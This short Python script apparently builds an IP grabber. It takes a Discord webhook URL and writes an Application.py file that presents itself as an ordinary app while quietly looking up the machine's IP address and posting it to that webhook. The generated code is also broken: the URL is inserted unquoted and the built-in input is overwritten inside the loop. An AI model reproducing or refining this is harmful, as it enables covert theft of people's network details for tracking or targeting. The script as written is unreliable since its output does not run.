url = input("Your Discord Webhook: ")

File_object = open("Application.py","a")
File_object.write('import requests \nimport socket \n\nprint("Press Enter to Close Application") \n\nhostname=socket.gethostname()   \nIPAddr=socket.gethostbyname(hostname)   \n\npayload_url='+ url + '\nwhile True: \n    message = input() \n    input=(IPAddr) \n    r =requests.post(payload_url, data={"content": IPAddr})')
File_object.close()
